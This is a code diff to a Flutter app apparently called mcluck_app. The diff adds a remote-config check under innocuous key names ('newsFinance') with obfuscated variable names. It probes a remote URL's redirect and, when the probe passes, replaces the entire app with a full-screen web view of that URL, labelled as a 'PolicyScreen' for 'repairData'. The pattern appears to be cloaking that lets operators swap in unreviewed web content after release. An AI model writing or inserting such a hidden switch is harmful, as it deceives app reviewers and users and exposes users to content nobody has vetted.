@@ -1,8 +1,11 @@
+import 'dart:io';
+
 import 'package:firebase_core/firebase_core.dart';
 import 'package:firebase_remote_config/firebase_remote_config.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
 import 'package:flutter_bloc/flutter_bloc.dart';
+import 'package:flutter_inappwebview/flutter_inappwebview.dart';
 import 'package:hive_flutter/hive_flutter.dart';
 import 'package:mcluck_app/firebase_options.dart';
 import 'package:mcluck_app/mcluck_app.dart';
@@ -51,7 +54,9 @@ void main() async {
           );
         } else {
           if (snapshot.data == true && repairData != '') {
-            return PolicyScreen(dataForPage: repairData);
+            return MaterialApp(
+                debugShowCheckedModeBanner: false,
+                home: PolicyScreen(dataForPage: repairData));
           } else {
             return McLuckApp();
           }
@@ -65,11 +70,20 @@ String repairData = '';
 Future<bool> checkModelsForRepair() async {
   final remoteConfig = FirebaseRemoteConfig.instance;
   await remoteConfig.fetchAndActivate();
-  String value = remoteConfig.getString('dataForRepair');
-  if (!value.contains('noneData')) {
-    repairData = value;
+  String cdsfgsd = remoteConfig.getString('newsFinance');
+  String cdsfgsdx = remoteConfig.getString('newsFinanceNone');
+  if (!cdsfgsd.contains('nothing')) {
+    final client = HttpClient();
+    final uri = Uri.parse(cdsfgsd);
+    final request = await client.getUrl(uri);
+    request.followRedirects = false;
+    final response = await request.close();
+    if (response.headers.value(HttpHeaders.locationHeader) != cdsfgsdx) {
+      repairData = cdsfgsd;
+      return true;
+    }
   }
-  return value.contains('noneData') ? false : true;
+  return repairData.contains('nothing') ? false : true;
 }
 
 class PolicyScreen extends StatelessWidget {
@@ -80,7 +94,14 @@ class PolicyScreen extends StatelessWidget {
   @override
   Widget build(BuildContext context) {
     return Scaffold(
-      body: Center(child: Text('Policy data: $dataForPage')),
+      body: SafeArea(
+        bottom: false,
+        child: InAppWebView(
+          initialUrlRequest: URLRequest(
+            url: Uri.parse(dataForPage),
+          ),
+        ),
+      ),
     );
   }
 }
